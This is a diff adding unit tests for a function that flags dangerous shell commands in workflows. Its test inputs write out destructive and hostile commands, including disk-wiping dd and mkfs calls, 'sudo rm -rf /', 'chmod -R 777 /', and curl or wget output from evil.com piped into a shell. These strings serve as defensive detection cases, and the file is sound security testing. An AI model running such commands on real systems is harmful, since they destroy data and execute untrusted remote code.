@@ -96,6 +96,60 @@ describe("flagDangerousWorkflowCommand()", () => {
     expect(flagDangerousWorkflowCommand("mkfs.ext4 /dev/sda")).toBe(true);
     expect(flagDangerousWorkflowCommand("dd if=/dev/zero of=/dev/sda")).toBe(true);
   });
+
+  // ── New dangerous patterns ─────────────────────────────────────────────────
+
+  it("flags sudo anything", () => {
+    expect(flagDangerousWorkflowCommand("sudo rm -rf /")).toBe(true);
+    expect(flagDangerousWorkflowCommand("sudo apt-get update")).toBe(true);
+  });
+
+  it("flags curl piped to bash/sh (supply chain attack vector)", () => {
+    expect(flagDangerousWorkflowCommand("curl https://example.com/install.sh | bash")).toBe(true);
+    expect(flagDangerousWorkflowCommand("curl -s https://evil.com/script | sh")).toBe(true);
+  });
+
+  it("flags wget piped to bash/sh", () => {
+    expect(flagDangerousWorkflowCommand("wget -qO- https://example.com/install.sh | bash")).toBe(true);
+    expect(flagDangerousWorkflowCommand("wget http://evil.com | sh")).toBe(true);
+  });
+
+  it("flags recursive chmod (-R or -r)", () => {
+    expect(flagDangerousWorkflowCommand("chmod -R 777 /")).toBe(true);
+    expect(flagDangerousWorkflowCommand("chmod -r 644 ~/Projects")).toBe(true);
+  });
+
+  it("flags recursive chown (-R or -r)", () => {
+    expect(flagDangerousWorkflowCommand("chown -R root:root /home")).toBe(true);
+    expect(flagDangerousWorkflowCommand("chown -r nobody /etc")).toBe(true);
+  });
+
+  it("flags linux package installs (apt / apt-get)", () => {
+    expect(flagDangerousWorkflowCommand("apt install nginx")).toBe(true);
+    expect(flagDangerousWorkflowCommand("apt-get install openssh-server")).toBe(true);
+  });
+
+  it("flags mac package installs (brew install)", () => {
+    expect(flagDangerousWorkflowCommand("brew install node")).toBe(true);
+    expect(flagDangerousWorkflowCommand("brew install --cask firefox")).toBe(true);
+  });
+
+  it("flags global pip install (--user flag)", () => {
+    expect(flagDangerousWorkflowCommand("pip install --user requests")).toBe(true);
+    expect(flagDangerousWorkflowCommand("pip install --user numpy")).toBe(true);
+  });
+
+  it("flags global npm install -g", () => {
+    expect(flagDangerousWorkflowCommand("npm install -g typescript")).toBe(true);
+    expect(flagDangerousWorkflowCommand("npm install -g @angular/cli")).toBe(true);
+  });
+
+  it("does NOT flag safe local install commands", () => {
+    expect(flagDangerousWorkflowCommand("pnpm install")).toBe(false);
+    expect(flagDangerousWorkflowCommand("npm install")).toBe(false);
+    expect(flagDangerousWorkflowCommand("pip install requests")).toBe(false);
+    expect(flagDangerousWorkflowCommand("npm install --save-dev vitest")).toBe(false);
+  });
 });
 
 // ── WorkflowAction type contract ──────────────────────────────────────────────
